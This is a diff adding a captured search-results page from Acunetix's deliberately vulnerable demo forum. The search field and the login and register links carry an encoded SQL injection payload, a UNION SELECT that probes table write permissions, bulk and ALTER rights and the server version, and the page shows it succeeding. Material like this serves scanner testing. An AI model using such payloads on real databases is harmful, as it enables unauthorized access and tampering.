@@ -1,0 +1,43 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>acuforum search</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+<table width="100%"  border="0" cellpadding="10" cellspacing="0"> 
+  <tr bgcolor="#008F00"> 
+    <td width="306px"><a href="https://www.acunetix.com/"><img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></td> 
+    <td align="right" valign="middle" bgcolor="#008F00" class="disclaimer">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><div class="menubar"><a href="Templatize.asp?item=html/about.html" class="menu">about</a> - <a href="Default.asp" class="menu">forums</a> - <a href="Search.asp" class="menu">search</a> 
+     - <a href="./Login.asp?RetURL=%2FSearch%2Easp%3FtfSearch%3Dzzq%2527%2529%253e0%2529%2BUNION%2BALL%2BSELECT%2B1%252c%2527W1%5Fupd%5Facuforum%5Fusers%253d%2527%252bISNULL%2528CAST%2528HAS%5FPERMS%5FBY%5FNAME%2528%2527acuforum%2Edbo%2Eusers%2527%252c%2527OBJECT%2527%252c%2527UPDATE%2527%2529%2BAS%2Bvarchar%2529%252c%2527NULL%2527%2529%252c%2527W2%5Fins%5Facuforum%5Fposts%253d%2527%252bISNULL%2528CAST%2528HAS%5FPERMS%5FBY%5FNAME%2528%2527acuforum%2Edbo%2Eposts%2527%252c%2527OBJECT%2527%252c%2527INSERT%2527%2529%2BAS%2Bvarchar%2529%252c%2527NULL%2527%2529%252c%2527W3%5Fupd%5Facublog%5Fusers%253d%2527%252bISNULL%2528CAST%2528HAS%5FPERMS%5FBY%5FNAME%2528%2527acublog%2Edbo%2Eusers%2527%252c%2527OBJECT%2527%252c%2527UPDATE%2527%2529%2BAS%2Bvarchar%2529%252c%2527NULL%2527%2529%252c0%252c0%252cGETDATE%2528%2529%252c%2527W4%5Fbulk%253d%2527%252bISNULL%2528CAST%2528HAS%5FPERMS%5FBY%5FNAME%2528NULL%252cNULL%252c%2527BULK%2BOPERATIONS%2527%2529%2BAS%2Bvarchar%2529%252c%2527NULL%2527%2529%252c%2527W5%5Falter%5Fdb%253d%2527%252bISNULL%2528CAST%2528HAS%5FPERMS%5FBY%5FNAME%2528NULL%252cNULL%252c%2527ALTER%2BANY%2BDATABASE%2527%2529%2BAS%2Bvarchar%2529%252c%2527NULL%2527%2529%252c%2527W6%5Fver%253d%2527%252bLEFT%2528%2540%2540version%252c4%2529%2D%2D" class="menu">login</a> - <a href="./Register.asp?RetURL=%2FSearch%2Easp%3FtfSearch%3Dzzq%2527%2529%253e0%2529%2BUNION%2BALL%2BSELECT%2B1%252c%2527W1%5Fupd%5Facuforum%5Fusers%253d%2527%252bISNULL%2528CAST%2528HAS%5FPERMS%5FBY%5FNAME%2528%2527acuforum%2Edbo%2Eusers%2527%252c%2527OBJECT%2527%252c%2527UPDATE%2527%2529%2BAS%2Bvarchar%2529%252c%2527NULL%2527%2529%252c%2527W2%5Fins%5Facuforum%5Fposts%253d%2527%252bISNULL%2528CAST%2528HAS%5FPERMS%5FBY%5FNAME%2528%2527acuforum%2Edbo%2Eposts%2527%252c%2527OBJECT%2527%252c%2527INSERT%2527%2529%2BAS%2Bvarchar%2529%252c%2527NULL%2527%2529%252c%2527W3%5Fupd%5Facublog%5Fusers%253d%2527%252bISNULL%2528CAST%2528HAS%5FPERMS%5FBY%5FNAME%2528%2527acublog%2Edbo%2Eusers%2527%252c%2527OBJECT%2527%252c%2527UPDATE%2527%2529%2BAS%2Bvarchar%2529%252c%2527NULL%2527%2529%252c0%252c0%252cGETDATE%2528%2529%252c%2527W4%5Fbulk%253d%2527%252bISNULL%2528CAST%2528HAS%5FPERMS%5FBY%5FNAME%2528NULL%252cNULL%252c%2527BULK%2BOPERATIONS%2527%2529%2BAS%2Bvarchar%2529%252c%2527NULL%2527%2529%252c%2527W5%5Falter%5Fdb%253d%2527%252bISNULL%2528CAST%2528HAS%5FPERMS%5FBY%5FNAME%2528NULL%252cNULL%252c%2527ALTER%2BANY%2BDATABASE%2527%2529%2BAS%2Bvarchar%2529%252c%2527NULL%2527%2529%252c%2527W6%5Fver%253d%2527%252bLEFT%2528%2540%2540version%252c4%2529%2D%2D" class="menu">register</a> 
+	- <a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu">SQL scanner</a> - <a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu">SQL vuln help</a>
+    </div></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><!-- InstanceBeginEditable name="MainContentLeft" -->
+      <form name="frmSearch" method="get" action="">
+        <div class="FramedForm">
+          <input name="tfSearch" type="text" class="search">
+          <input class="search" type="submit" value="search posts">
+        </div>
+      </form>      
+        <div class='path'>You searched for 'zzq')>0) UNION ALL SELECT 1,'W1_upd_acuforum_users='+ISNULL(CAST(HAS_PERMS_BY_NAME('acuforum.dbo.users','OBJECT','UPDATE') AS varchar),'NULL'),'W2_ins_acuforum_posts='+ISNULL(CAST(HAS_PERMS_BY_NAME('acuforum.dbo.posts','OBJECT','INSERT') AS varchar),'NULL'),'W3_upd_acublog_users='+ISNULL(CAST(HAS_PERMS_BY_NAME('acublog.dbo.users','OBJECT','UPDATE') AS varchar),'NULL'),0,0,GETDATE(),'W4_bulk='+ISNULL(CAST(HAS_PERMS_BY_NAME(NULL,NULL,'BULK OPERATIONS') AS varchar),'NULL'),'W5_alter_db='+ISNULL(CAST(HAS_PERMS_BY_NAME(NULL,NULL,'ALTER ANY DATABASE') AS varchar),'NULL'),'W6_ver='+LEFT(@@version,4)--'</div><table width="100%" cellspacing="1" cellpadding="5" bgcolor="#E5E5E5"><tr><td valign='top' align='center' bgcolor='#FFFFFF' width='120'><img src='avatars/W4_bulk=NULL'><br>posted by <b>W1_upd_acuforum_users=1</b> on 9/28/2026 8:18:26 AM</td><td valign='top' bgcolor='#FFFFFF'><div class='path'>Found in: <a href='showforum.asp?id=0'>W6_ver=Micr</a>/<a href='showthread.asp?id=0'>W5_alter_db=0</a></div><div class='posttitle'>W2_ins_acuforum_posts=1</div><div class='posttext'>W3_upd_acublog_users=1</div></td></tr></table>      
+      <!-- InstanceEndEditable --></td> 
+  </tr> 
+  <tr align="right" bgcolor="#FFFFFF"> 
+    <td colspan="2" class="footer">Copyright 2019 Acunetix Ltd.</td> 
+  </tr> 
+</table> 
+<div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px">
+	<p style="padding-left:20%;padding-right:20%"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>
+</div>
+</body>
+<!-- InstanceEnd --></html>
